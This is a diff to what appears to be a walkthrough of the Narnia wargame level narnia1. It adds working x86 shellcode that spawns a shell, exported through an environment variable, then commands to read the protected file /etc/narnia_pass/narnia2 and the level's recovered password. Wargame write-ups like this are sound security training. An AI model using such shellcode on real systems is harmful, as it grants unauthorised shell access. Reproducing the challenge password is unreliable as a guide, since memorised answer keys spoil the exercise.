@@ -1293,12 +1293,20 @@ cd /narnia
 ls
 ./narnia1
 cat narnia1.c
-
-export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG EGG")')
 ```
-
+Refer: https://shell-storm.org/shellcode/files/shellcode-607.html
+```bash
+export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90"*100 + b"\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80")')
+export EGG=$(python3 -c 'import sys; sys.stdout.buffer.write(b"\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81")')
+echo $EGG
+./narnia1
+```
+```bash
+whoami
+cat /etc/narnia_pass/narnia2
+```
 Output:
 ```bash
-
+5agRAXeBdG
 ```
-**Password: **
+**Password: 5agRAXeBdG**
